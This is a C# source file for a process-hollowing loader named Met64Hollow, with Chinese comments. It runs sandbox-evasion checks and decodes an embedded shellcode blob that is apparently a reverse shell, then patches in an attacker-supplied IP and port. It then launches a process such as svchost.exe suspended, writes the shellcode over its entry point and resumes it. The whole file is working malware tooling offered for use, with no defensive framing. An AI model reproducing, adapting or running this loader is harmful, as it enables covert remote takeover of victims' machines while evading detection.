using System;
using System.Runtime.InteropServices;
using System.Net;

namespace Met64Hollow
{
    class Program
    {
        // ---------- 创建挂起进程 ----------
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        // ---------- 查询进程基本信息（取 PEB 地址）----------
        [DllImport("ntdll.dll")]
        static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen);

        // ---------- 内存读写 ----------
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        // ---------- 恢复线程 ----------
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        // ---------- 反沙箱 API ----------
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, uint nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        // ---------- 结构体 ----------
        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public int cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
            public short wShowWindow, cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        static void Main(string[] args)
        {
            Console.WriteLine("[*] Met64Hollow (x64) started");

            // 参数：IP 端口 目标进程路径
            if (args.Length < 3)
            {
                Console.WriteLine("[-] Usage: Met64Hollow.exe <IP> <Port> <ProcessPath>");
                Console.WriteLine("    e.g. Met64Hollow.exe 192.168.1.88 4444 C:\\Windows\\System32\\svchost.exe");
                return;
            }

            if (!IPAddress.TryParse(args[0], out IPAddress ip))
            { Console.WriteLine("[-] Invalid IP"); return; }
            if (!int.TryParse(args[1], out int port) || port < 1 || port > 65535)
            { Console.WriteLine("[-] Invalid port"); return; }
            string targetExe = args[2];   // 要镂空的进程完整路径
            Console.WriteLine("[*] Target: {0}:{1} -> hollow '{2}'", ip, port, targetExe);

            // ---------- 反沙箱 ----------
            Console.WriteLine("[*] Sleeping 5 seconds...");
            var t1 = DateTime.Now; Sleep(5000);
            if ((DateTime.Now - t1).TotalSeconds < 4.5) return;
            Console.WriteLine("[*] Testing NUMA allocation...");
            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero) return;
            Console.WriteLine("[+] NUMA alloc succeeded");

            // ---------- 载荷解密与 IP/端口替换 ----------
            byte[] enc = { 0x01,0x4d,0x88,0xe9,0xf5,0xed,0xd1,0x05,0x05,0x05,0x46,0x56,0x46,0x55,0x57,0x4d,0x36,0xd7,0x56,0x6a,0x4d,0x90,0x57,0x65,0x4d,0x90,0x57,0x1d,0x5b,0x4d,0x90,0x57,0x25,0x4d,0x90,0x77,0x55,0x4d,0x14,0xbc,0x4f,0x4f,0x52,0x36,0xce,0x4d,0x36,0xc5,0xb1,0x41,0x66,0x81,0x07,0x31,0x25,0x46,0xc6,0xce,0x12,0x46,0x06,0xc6,0xe7,0xf2,0x57,0x4d,0x90,0x57,0x25,0x90,0x47,0x41,0x46,0x56,0x4d,0x06,0xd5,0x6b,0x86,0x7d,0x1d,0x10,0x07,0x14,0x8a,0x77,0x05,0x05,0x05,0x90,0x85,0x8d,0x05,0x05,0x05,0x4d,0x8a,0xc5,0x79,0x6c,0x4d,0x06,0xd5,0x55,0x49,0x90,0x45,0x25,0x4e,0x06,0xd5,0x90,0x4d,0x1d,0xe8,0x5b,0x4d,0x04,0xce,0x52,0x36,0xce,0x46,0x90,0x39,0x8d,0x4d,0x06,0xdb,0x4d,0x36,0xc5,0x46,0xc6,0xce,0x12,0xb1,0x46,0x06,0xc6,0x3d,0xe5,0x7a,0xf6,0x51,0x08,0x51,0x29,0x0d,0x4a,0x3e,0xd6,0x7a,0xdd,0x5d,0x49,0x90,0x45,0x29,0x4e,0x06,0xd5,0x6b,0x46,0x90,0x11,0x4d,0x49,0x90,0x45,0x21,0x4e,0x06,0xd5,0x46,0x90,0x09,0x8d,0x4d,0x06,0xd5,0x46,0x5d,0x46,0x5d,0x63,0x5e,0x5f,0x46,0x5d,0x46,0x5e,0x46,0x5f,0x4d,0x88,0xf1,0x25,0x46,0x57,0x04,0xe5,0x5d,0x46,0x5e,0x5f,0x4d,0x90,0x17,0xee,0x50,0x04,0x04,0x04,0x62,0x4e,0xc3,0x7c,0x78,0x37,0x64,0x38,0x37,0x05,0x05,0x46,0x5b,0x4e,0x8e,0xeb,0x4d,0x86,0xf1,0xa5,0x06,0x05,0x05,0x4e,0x8e,0xea,0x4e,0xc1,0x07,0x05,0x27,0x27,0x16,0x16,0x16,0x16,0x46,0x59,0x4e,0x8e,0xe9,0x51,0x8e,0xf6,0x46,0xbf,0x51,0x7c,0x2b,0x0c,0x04,0xda,0x51,0x8e,0xef,0x6d,0x06,0x06,0x05,0x05,0x5e,0x46,0xbf,0x2e,0x85,0x70,0x05,0x04,0xda,0x6f,0x0f,0x46,0x63,0x55,0x55,0x52,0x36,0xce,0x52,0x36,0xc5,0x4d,0x04,0xc5,0x4d,0x8e,0xc7,0x4d,0x04,0xc5,0x4d,0x8e,0xc6,0x46,0xbf,0xef,0x14,0xe4,0xe5,0x04,0xda,0x4d,0x8e,0xcc,0x6f,0x15,0x46,0x5d,0x51,0x8e,0xe7,0x4d,0x8e,0xfe,0x46,0xbf,0x9e,0xaa,0x79,0x66,0x04,0xda,0x8a,0xc5,0x79,0x0f,0x4e,0x04,0xd3,0x7a,0xea,0xed,0x98,0x05,0x05,0x05,0x4d,0x88,0xf1,0x15,0x4d,0x8e,0xe7,0x52,0x36,0xce,0x6f,0x09,0x46,0x5d,0x4d,0x8e,0xfe,0x46,0xbf,0x07,0xde,0xcd,0x64,0x04,0xda,0x88,0xfd,0x05,0x83,0x5a,0x4d,0x88,0xc9,0x25,0x63,0x8e,0xfb,0x6f,0x45,0x46,0x5e,0x6d,0x05,0x15,0x05,0x05,0x46,0x5d,0x4d,0x8e,0xf7,0x4d,0x36,0xce,0x46,0xbf,0x5d,0xa9,0x58,0xea,0x04,0xda,0x4d,0x8e,0xc8,0x4e,0x8e,0xcc,0x52,0x36,0xce,0x4e,0x8e,0xf5,0x4d,0x8e,0xdf,0x4d,0x8e,0xfe,0x46,0xbf,0x07,0xde,0xcd,0x64,0x04,0xda,0x88,0xfd,0x05,0x82,0x2d,0x5d,0x46,0x5c,0x5e,0x6d,0x05,0x45,0x05,0x05,0x46,0x5d,0x6f,0x05,0x5f,0x46,0xbf,0x10,0x34,0x14,0x35,0x04,0xda,0x5c,0x5e,0x46,0xbf,0x7a,0x73,0x52,0x66,0x04,0xda,0x4e,0x04,0xd3,0xee,0x41,0x04,0x04,0x04,0x4d,0x06,0xc8,0x4d,0x2e,0xcb,0x4d,0x8a,0xfb,0x7a,0xb9,0x46,0x04,0xec,0x5d,0x6f,0x05,0x5e,0x4e,0xcc,0xc7,0xf5,0xba,0xa7,0x5b,0x04,0xda };
            byte[] buf = new byte[enc.Length];
            for (int i = 0; i < buf.Length; i++)
                buf[i] = (byte)(((uint)enc[i] - 5) & 0xFF);

            // 定位 IP/端口占位符并替换
            byte[] pattern = { 0x02, 0x00, 0x22, 0x22 };
            int pos = FindBytes(buf, pattern);
            if (pos == -1) { Console.WriteLine("[-] Pattern not found"); return; }
            int portOffset = pos + 2;
            int ipOffset = pos + 4;
            buf[portOffset] = (byte)((port >> 8) & 0xFF);
            buf[portOffset + 1] = (byte)(port & 0xFF);
            Buffer.BlockCopy(ip.GetAddressBytes(), 0, buf, ipOffset, 4);
            Console.WriteLine("[*] Payload configured for {0}:{1}", ip, port);

            // ---------- 创建挂起进程 ----------
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            // 目标 exe 路径作为命令行参数传入（lpApplicationName 可留空，通过 lpCommandLine 传递完整路径）
            bool created = CreateProcess(null, targetExe, IntPtr.Zero, IntPtr.Zero, false,
                0x4, // CREATE_SUSPENDED
                IntPtr.Zero, null, ref si, out pi);
            if (!created)
            {
                Console.WriteLine("[-] CreateProcess failed: {0}", Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Created {0} (PID {1}) suspended", targetExe, pi.dwProcessId);

            // ---------- 获取入口点 ----------
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            int status = ZwQueryInformationProcess(pi.hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((long)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr read1;
            ReadProcessMemory(pi.hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out read1);
            IntPtr imageBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] peHeader = new byte[0x200];
            ReadProcessMemory(pi.hProcess, imageBase, peHeader, peHeader.Length, out read1);
            uint e_lfanew = BitConverter.ToUInt32(peHeader, 0x3C);
            uint entryRva = BitConverter.ToUInt32(peHeader, (int)e_lfanew + 0x28);
            IntPtr entryPoint = (IntPtr)((long)imageBase + entryRva);
            Console.WriteLine("[*] EntryPoint at 0x{0:X}", entryPoint.ToInt64());

            // ---------- 写入 shellcode ----------
            IntPtr written;
            bool wrote = WriteProcessMemory(pi.hProcess, entryPoint, buf, buf.Length, out written);
            if (!wrote)
            {
                Console.WriteLine("[-] WriteProcessMemory failed: {0}", Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Shellcode written ({0} bytes)", (int)written);

            // ---------- 恢复线程 ----------
            ResumeThread(pi.hThread);
            Console.WriteLine("[+] Thread resumed. Hollow success.");
        }

        static int FindBytes(byte[] src, byte[] pat)
        {
            for (int i = 0; i <= src.Length - pat.Length; i++)
            {
                bool ok = true;
                for (int j = 0; j < pat.Length; j++)
                    if (src[i + j] != pat[j]) { ok = false; break; }
                if (ok) return i;
            }
            return -1;
        }
    }
}